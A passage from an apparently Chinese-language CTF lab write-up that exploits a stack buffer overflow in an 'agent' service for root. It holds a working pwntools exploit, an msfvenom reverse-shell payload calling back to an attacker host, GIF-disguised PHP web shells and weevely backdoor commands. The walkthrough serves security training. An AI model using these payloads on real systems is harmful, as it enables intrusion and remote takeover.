class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ecx</span> + <span class="hljs-built_in">ebp</span>*<span class="hljs-number">2</span> + <span class="hljs-number">0x62</span>], <span class="hljs-number">ch</span><br><span class="hljs-number">12</span>:<span class="hljs-number">0048</span>│      <span class="hljs-number">0xffffd118</span> —▸ <span class="hljs-number">0xffffd158</span> —▸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">13</span>:004c│      <span class="hljs-number">0xffffd11c</span> ◂— <span class="hljs-number">0x6191c00</span><br><span class="hljs-number">14</span>:<span class="hljs-number">0050</span>│      <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xf7fb5d20</span> (_IO_2_1_stdout_) ◂— <span class="hljs-keyword">xchg</span>   <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>], <span class="hljs-built_in">ebp</span> /* <span class="hljs-number">0xfbad2887</span> */<br><span class="hljs-number">15</span>:<span class="hljs-number">0054</span>│      <span class="hljs-number">0xffffd124</span> —▸ <span class="hljs-number">0xf7dd453c</span> ◂— <span class="hljs-keyword">inc</span>    <span class="hljs-built_in">esi</span><br><span class="hljs-number">16</span>:<span class="hljs-number">0058</span>│      <span class="hljs-number">0xffffd128</span> ◂— <span class="hljs-number">0x7</span><br><span class="hljs-number">17</span>:005c│      <span class="hljs-number">0xffffd12c</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">18</span>:<span class="hljs-number">0060</span>│      <span class="hljs-number">0xffffd130</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br>1a:<span class="hljs-number">0068</span>│      <span class="hljs-number">0xffffd138</span> —▸ <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">1b</span>:006c│      <span class="hljs-number">0xffffd13c</span> —▸ <span class="hljs-number">0xf7e20469</span> (__isoc99_scanf+<span class="hljs-number">41</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">esp</span>, <span class="hljs-number">0x1c</span><br>1c:<span class="hljs-number">0070</span>│      <span class="hljs-number">0xffffd140</span> —▸ <span class="hljs-number">0xf7fb5580</span> (_IO_2_1_stdin_) ◂— <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">edx</span>], <span class="hljs-number">ah</span> /* <span class="hljs-number">0xfbad2288</span> */<br><span class="hljs-number">1d</span>:<span class="hljs-number">0074</span>│      <span class="hljs-number">0xffffd144</span> —▸ <span class="hljs-number">0x8048af2</span> ◂— <span class="hljs-keyword">and</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x450a0064</span> /* <span class="hljs-string">&#x27;%d&#x27;</span> */<br>1e:<span class="hljs-number">0078</span>│      <span class="hljs-number">0xffffd148</span> —▸ <span class="hljs-number">0xffffd164</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>1f:007c│      <span class="hljs-number">0xffffd14c</span> ◂— <span class="hljs-number">0x2</span><br><span class="hljs-number">20</span>:<span class="hljs-number">0080</span>│      <span class="hljs-number">0xffffd150</span> —▸ <span class="hljs-number">0xffffd178</span> ◂— <span class="hljs-number">0x3</span><br><span class="hljs-number">21</span>:<span class="hljs-number">0084</span>│      <span class="hljs-number">0xffffd154</span> —▸ <span class="hljs-number">0xf7ffd990</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">22</span>:<span class="hljs-number">0088</span>│      <span class="hljs-number">0xffffd158</span> —▸ <span class="hljs-number">0xf7e20449</span> (__isoc99_scanf+<span class="hljs-number">9</span>) ◂— <span class="hljs-keyword">add</span>    <span class="hljs-built_in">eax</span>, <span class="hljs-number">0x194bb7</span><br><span class="hljs-number">23</span>:008c│      <span class="hljs-number">0xffffd15c</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">24</span>:<span class="hljs-number">0090</span>│      <span class="hljs-number">0xffffd160</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br><span class="hljs-number">26</span>:<span class="hljs-number">0098</span>│      <span class="hljs-number">0xffffd168</span> —▸ <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-number">27</span>:009c│      <span class="hljs-number">0xffffd16c</span> —▸ <span class="hljs-number">0x80487ce</span> (menu+<span class="hljs-number">128</span>) ◂— <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">ebp</span> - <span class="hljs-number">9</span>], <span class="hljs-built_in">al</span><br><span class="hljs-number">28</span>:00a0│      <span class="hljs-number">0xffffd170</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>... ↓<br>2a:00a8│      <span class="hljs-number">0xffffd178</span> ◂— <span class="hljs-number">0x3</span><br>2b:00ac│      <span class="hljs-number">0xffffd17c</span> ◂— <span class="hljs-number">0xa0486ff</span><br>2c:00b0│      <span class="hljs-number">0xffffd180</span> —▸ <span class="hljs-number">0x8048a75</span> ◂— <span class="hljs-keyword">dec</span>    <span class="hljs-built_in">esp</span> /* <span class="hljs-string">&#x27;Login Validated &#x27;</span> */<br><span class="hljs-number">2d</span>:00b4│      <span class="hljs-number">0xffffd184</span> —▸ <span class="hljs-number">0xf7fb5000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="hljs-keyword">insb</span>   <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">es</span>:[<span class="hljs-built_in">edi</span>], <span class="hljs-built_in">dx</span> /* <span class="hljs-number">0x1e9d6c</span> */<br>2e:00b8│ <span class="hljs-built_in">ebp</span>  <span class="hljs-number">0xffffd188</span> —▸ <span class="hljs-number">0xffffd1b8</span> ◂— <span class="hljs-number">0x0</span><br>2f:00bc│      <span class="hljs-number">0xffffd18c</span> —▸ <span class="hljs-number">0x804872f</span> (main+<span class="hljs-number">308</span>) ◂— <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x8048741</span><br>pwndbg&gt; <br></code></pre></td></tr></table></figure>
+<p>从而计算得出栈偏移为：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">栈偏移 = <span class="hljs-built_in">EBP</span>地址 - 当前输入地址 + <span class="hljs-built_in">EBP</span>字长<br>       = <span class="hljs-number">0xd188</span> - <span class="hljs-number">0xd0e4</span> + <span class="hljs-number">4</span> = <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure>
+<p>找到栈偏移之后，我们需要将 return 地址修改为 shellcode 地址，这里可以使用 ROPgadget 寻找包含 call eax 的代码段，这里找到 <code>call eax</code> 地址为 0x8048563 。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent | grep <span class="hljs-string">&quot;call eax&quot;</span></span><br>0x0804855d : adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x08048561 : add al, 8 ; call eax<br>0x08048563 : call eax<br>0x0804855f : cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855c : in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855a : in eax, 0x83 ; in al, dx ; adc al, 0x68 ; cmp al, 0xb0 ; add al, 8 ; call eax<br>0x0804855e : push 0x804b03c ; call eax<br>0x0804855b : sub esp, 0x14 ; push 0x804b03c ; call eax<br><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary agent --only <span class="hljs-string">&quot;call&quot;</span></span>    <br>Gadgets information<br>============================================================<br>0x08048941 : call dword ptr [eax + 0x68]<br>0x0804892f : call dword ptr [eax - 0x18]<br>0x08048e1f : call dword ptr [ebx + 1]<br>0x08048563 : call eax<br>0x0804859d : call edx<br><br>Unique gadgets found: 5<br></code></pre></td></tr></table></figure>
+<h3 id="3、exp编写"><a href="#3、exp编写" class="headerlink" title="3、exp编写"></a>3、exp编写</h3><p>用 pwntools 编写脚本，通过 asm 构造 shellcode 内容。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># agent</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;192.168.135.146&quot;</span>, <span class="hljs-number">7788</span>)<br><br>shellcode = asm(shellcraft.sh())<br>shell_addr = <span class="hljs-number">0x8048563</span><br><br>io.recvuntil(<span class="hljs-string">b&quot;Agent ID : &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;48093572&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;Enter selection: &quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>io.recv()<br><br>payload = shellcode.ljust(<span class="hljs-number">168</span>,<span class="hljs-string">b&#x27;A&#x27;</span>) + p32(shell_addr)<br>io.sendline(payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>
+<p>执行，得到 root 权限，得到最终 flag6{R2gwc3RQcm90MGMwbHM=} ，解码为 flag{Gh0stProt0c0ls}。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 exp.py</span><br>[+] Opening connection to 192.168.135.146 on port 7788: Done<br>[*] Switching to interactive mode<br>Report: jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04\xe1Q\x89\xe11\xd2j\x0b̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc\x85\x04<br>Submitted for review.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>bin<br>boot<br>dev<br>etc<br>home<br>initrd.img<br>initrd.img.old<br>lib<br>lib32<br>lib64<br>libx32<br>lost+found<br>media<br>mnt<br>opt<br>proc<br>root<br>run<br>sbin<br>snap<br>srv<br>sys<br>tmp<br>usr<br>var<br>vmlinuz<br>vmlinuz.old<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> root</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>Flag.txt<br>TheEnd.txt<br><span class="hljs-meta">$</span><span class="bash"> cat Flag.txt</span><br>flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br><span class="hljs-meta">$</span><span class="bash"> </span> <br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、纯虚拟靶场：手动操作，利用 web 漏洞，寻找 flag 。</p>
+<p>2、网页：抓字典</p>
+<p>3、登录爆破：hydra、burp；用户名和密码分开爆破、密码绕过</p>
+<p>4、sql：sqlmap、文件方式、dump慎用</p>
+<p>5、文件上传：waf、绕过方式，结合gif/jpg、eval/system/‘’</p>
+<p>6、一句话成功 - 小马大马：两机间文件传输（python 最容易成功）</p>
+<p>7、反弹马：bash、PHP、java、python</p>
+<p>8、反弹shell：nc、php、python（渗透测试必备、内网渗透基础）</p>
+<p>伪shell - bin/bash、bin/sh（特殊功能键不可用） - 稳定shell（raw：稳定、原生态）    </p>
+<p>伪shell：meterpreter</p>
+<p>bin/bash：python/python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+<p>稳定shell：ctrl + z；stty raw -echo；fg</p>
+<blockquote>
+<p>stty raw -echo    就是用RAW模式来原封不动的传输回显数据，在设置时不要回显多余的信息。也就是常说的稳定shell。<br>fg（frontground）前台执行；bg（background）后台执行<br>Linux提供的 fg 和 bg 命令，可以调度正在运行的任务。</p>
+</blockquote>
+<p>9、一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># eval\system\php反引号=&gt;执行(可能存在过滤)</span><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `id`; <span class="hljs-meta">?&gt;</span><br><br>GIF89a<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$wzz</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wzz&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$wzz</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>1、在靶机中获得 ID：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> agent</span> <br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br><br>Agent ID : 123<br>Invalid Agent ID <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> ltrace用来跟踪进程调用库函数的情况</span><br><span class="hljs-meta">$</span><span class="bash"> ltrace agent</span><br>__libc_start_main(0x80485fb, 1, 0xffe61b74, 0x8048970 &lt;unfinished ...&gt;<br>setbuf(0xf76fad60, 0)                            = &lt;void&gt;<br>asprintf(0xffe61aa8, 0x80489f0, 0x2ddd984, 0xf75620fc) = 8<br>puts(&quot;  ___ __  __ ___ &quot;  ___ __  __ ___ <br>)                        = 18<br>puts(&quot; |_ _|  \\/  | __|  Agent&quot; |_ _|  \/  | __|  Agent<br>)                = 25<br>puts(&quot;  | || |\\/| | _|   Reporting&quot;  | || |\/| | _|   Reporting<br>)            = 29<br>puts(&quot; |___|_|  |_|_|    System\n&quot; |___|_|  |_|_|    System<br><br>)              = 27<br>printf(&quot;\nAgent ID : &quot;<br>Agent ID : )                          = 12<br>fgets(<br>&quot;\n&quot;, 9, 0xf76fa5a0)                       = 0xffe61aae<br>strncmp(&quot;\n&quot;, &quot;48093572&quot;, 8)                     = -1<br>puts(&quot;Invalid Agent ID &quot;Invalid Agent ID <br>)                        = 18<br>+++ exited (status 254) +++<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> agent</span><br>  ___ __  __ ___ <br> |_ _|  \/  | __|  Agent<br>  | || |\/| | _|   Reporting<br> |___|_|  |_|_|    System<br><br>Agent ID : 48093572<br>Login Validated <br>Main Menu:<br>1. Extraction Points<br>2. Request Extraction<br>3. Submit Report<br>0. Exit<br>Enter selection: 0<br>Exiting...<br></code></pre></td></tr></table></figure>
+<p><strong>2、端口敲门服务（端口碰撞）</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/210177505">靶机-简单谈一下端口碰撞技术 (Port Knocking) - 知乎 (zhihu.com)</a></p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> knock 192.168.135.146 7482 8279 9467  <span class="hljs-comment"># knock</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nmap -p7482,8279,9467 192.168.135.146   <span class="hljs-comment"># nmap</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>3、weevely</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/106587791">Weevely(Linux中的菜刀)_WHOAMIAnony的博客-CSDN博客</a></p>
+</blockquote>
+<p>后门生成：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely generate &lt;连接密码&gt; &lt;file&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely generate <span class="hljs-built_in">test</span> hello.php</span><br>Generated backdoor with password &#x27;test&#x27; in &#x27;hello.php&#x27; of 1486 byte size. <br><span class="hljs-meta">$</span><span class="bash"> find / -name hello.php</span><br>/usr/share/weevely/hello.php<br></code></pre></td></tr></table></figure>
+<p>连接后门：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely &lt;url&gt; &lt;连接密码&gt;</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.110.129/hello.php <span class="hljs-built_in">test</span></span><br><br>[+] weevely 3.2.0<br><br>[+] Target:	winxp-0947be9ad:C:\phpstudy\WWW<br>[+] Session:	/root/.weevely/sessions/192.168.110.129/hello_0.session<br>[+] Shell:	System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/b533cd00f6f4.gif hello</span><br></code></pre></td></tr></table></figure>
+<p><strong>4、查找：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -name agent 2&gt;/dev/null  <span class="hljs-comment"># 2&gt;/dev/null：将错误输出到/dev/null,只显示正确结果</span></span><br>/usr/local/bin/agent<br>/etc/xinetd.d/agent<br></code></pre></td></tr></table></figure>
+<p><strong>5、查看端口，端口 7788 也有代理在运行</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -ant</span><br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State      <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     <br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     <br>tcp        0      0 0.0.0.0:7788            0.0.0.0:*               LISTEN     <br>tcp        0      0 192.168.135.146:36550   192.168.135.141:1234    ESTABLISHED<br>tcp6       0      0 :::22                   :::*                    LISTEN     <br>tcp6       0      0 :::80                   :::*                    LISTEN     <br>tcp6       0      0 192.168.135.146:80      192.168.135.141:46088   ESTABLISHED<br><span class="hljs-meta">$</span><span class="bash"> cat /etc/services | grep 7788</span><br>agent           7788/tcp                        # Agent service<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ps -aux <span class="hljs-comment"># 查询进程</span></span><br><span class="hljs-meta">$</span><span class="bash"> netstat -tulnp | grep 8888</span><br></code></pre></td></tr></table></figure>
+<p><strong>6、当前目录执行 php 脚本开启简易 web 服务器：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> php -S 192.168.135.141:4488</span><br></code></pre></td></tr></table></figure>
+<p><strong>7、提权</strong></p>
+<p>通过缓冲区溢出 agent 进程获得 root 权限。</p>
+<p>使用 msfvenom 创建一个 shellcode：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.135.141 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> -p 选择payload(此次因为agent是32位，所以使用X86)</span><br><span class="hljs-meta">#</span><span class="bash"> LHOST 、LPORT 监测主机IP和端口</span><br><span class="hljs-meta">#</span><span class="bash"> -f 指定生成xxx格式</span><br><span class="hljs-meta">#</span><span class="bash"> -b 在生成的程序中避免出现的值</span><br><span class="hljs-meta">#</span><span class="bash"> \x00 == 0x00 ASCII控制字符表中对应 NULL (空字符)</span><br><span class="hljs-meta">#</span><span class="bash"> \x0a == 0X0a ASCII控制字符表中对应 LF （换行键）</span><br><span class="hljs-meta">#</span><span class="bash"> \x0b == 0x0b ASCII控制字符表中对应 VT (垂直定位符号)</span><br></code></pre></td></tr></table></figure>
+<p>使用大佬写的py脚本，将生成的内容，替换 python 脚本内容：<a target="_blank" rel="noopener" href="https://github.com/jessekurrus/agentsploit">https://github.com/jessekurrus/agentsploit</a></p>
+<p>将 shellcode 进行替换，下面部分：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">buf =  &quot;&quot;<br>buf += &quot;\xba\xf9\x03\x07\x8f\xd9\xe5\xd9\x74\x24\xf4\x5b\x31&quot;<br>buf += &quot;\xc9\xb1\x12\x31\x53\x12\x03\x53\x12\x83\x12\xff\xe5&quot;<br>buf += &quot;\x7a\xd5\xdb\x1d\x67\x46\x9f\xb2\x02\x6a\x96\xd4\x63&quot;<br>buf += &quot;\x0c\x65\x96\x17\x89\xc5\xa8\xda\xa9\x6f\xae\x1d\xc1&quot;<br>buf += &quot;\xaf\xf8\xdf\x1e\x58\xfb\xdf\x31\xf8\x72\x3e\x81\x9e&quot;<br>buf += &quot;\xd4\x90\xb2\xed\xd6\x9b\xd5\xdf\x59\xc9\x7d\x8e\x76&quot;<br>buf += &quot;\x9d\x15\x26\xa6\x4e\x87\xdf\x31\x73\x15\x73\xcb\x95&quot;<br>buf += &quot;\x29\x78\x06\xd5&quot;<br></code></pre></td></tr></table></figure>
+<p>监听端口4448：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4448</span><br></code></pre></td></tr></table></figure>
+<p>执行 exp 代码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py 192.168.135.146 7788</span><br></code></pre></td></tr></table></figure>
+<p>连接成功，访问得到 <strong>flag6：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag6">flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br></code></pre></td></tr></table></figure>
+<p><strong>8、图片马：</strong></p>
+<p>在php文件里写入：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$s</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$s</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>再使用 windows 命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> copy /b 文件1+文件2 文件3</span><br></code></pre></td></tr></table></figure>
+<p>将php文件和图像文件合并。 </p>
+<p><strong>9、edb调试提权</strong></p>
+<p>使用edb对程序进行测试：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> edb --run agent</span><br></code></pre></td></tr></table></figure>
+<p>运行程序后先选择 <code>3.submit report</code> 进行测试：</p>
+<p>运行<code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024</code>来获取1024个测试字符，然后输入字符：</p>
